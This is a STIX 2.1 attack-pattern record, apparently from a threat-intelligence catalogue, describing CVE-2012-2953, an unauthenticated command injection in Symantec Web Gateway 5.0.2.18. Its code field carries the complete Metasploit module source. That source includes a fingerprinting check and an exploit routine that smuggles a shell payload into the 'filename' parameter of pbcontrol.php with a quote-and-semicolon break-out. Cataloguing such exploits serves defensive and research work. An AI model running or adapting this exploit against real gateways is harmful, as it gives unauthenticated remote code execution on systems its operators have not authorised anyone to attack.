{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6773b44f-3f73-47ae-aa22-c8f2044b16ad",
    "created": "2024-08-14T17:04:40.111748Z",
    "modified": "2024-08-14T17:04:40.111751Z",
    "name": "\"Symantec Web Gateway 5.0.2.18 pbcontrol.php Command Injection\"",
    "description": " This module exploits a command injection vulnerability found in Symantec Web Gateway's HTTP service.  While handling the filename parameter, the Spywall API does not do any filtering before passing it to an exec() call in proxy_file() thus results in remote code execution under the context of the web server. Please note authentication is NOT needed to gain access.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/symantec_web_gateway_pbcontrol.rb",
            "external_id": "symantec_web_gateway_pbcontrol.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-2953"
        },
        {
            "source_name": "reference",
            "url": "http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120720_00"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Symantec Web Gateway 5.0.2.18 pbcontrol.php Command Injection\",\n      'Description'    => %q{\n          This module exploits a command injection vulnerability found in Symantec Web\n        Gateway's HTTP service.  While handling the filename parameter, the Spywall API\n        does not do any filtering before passing it to an exec() call in proxy_file(),\n        thus results in remote code execution under the context of the web server. Please\n        note authentication is NOT needed to gain access.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'muts',  # Original discovery\n          'sinn3r' # Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-2953' ],\n          [ 'OSVDB', '84120' ],\n          [ 'BID', '54426' ],\n          [ 'EDB', '20088' ],\n          [ 'URL', 'http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120720_00']\n        ],\n      'Payload'        =>\n        {\n          #'BadChars' => \"\\x00\\x0d\\x0a\",\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl telnet'\n            }\n        },\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Targets'        =>\n        [\n          ['Symantec Web Gateway 5.0.2.18', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-07-23',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI path to pbcontrol', '/spywall/pbcontrol.php'])\n      ])\n  end\n\n\n  def check\n    dir = File.dirname(target_uri.path)\n\n    res1 = send_request_raw({'uri' => \"#{dir}/login.php\"})\n    res2 = send_request_raw({'uri' => \"#{dir}/pbcontrol.php\"})\n\n    if res1 and res2\n      if res1.body =~ /\\<title\\>Symantec Web Gateway\\<\\/title\\>/ and res2.body =~ /^0$/\n        return Exploit::CheckCode::Detected\n      end\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n\n  def exploit\n    send_request_cgi({\n      'uri'      => target_uri.path,\n      'method'   => 'GET',\n      'vars_get' => {\n        'filename' => \"#{Rex::Text.rand_text_alpha(4)}\\\";#{payload.encoded};\\\"\",\n        'stage' => '0'\n      }\n    })\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-07-23",
    "x_mitre_platforms": [
        "['unix']"
    ]
}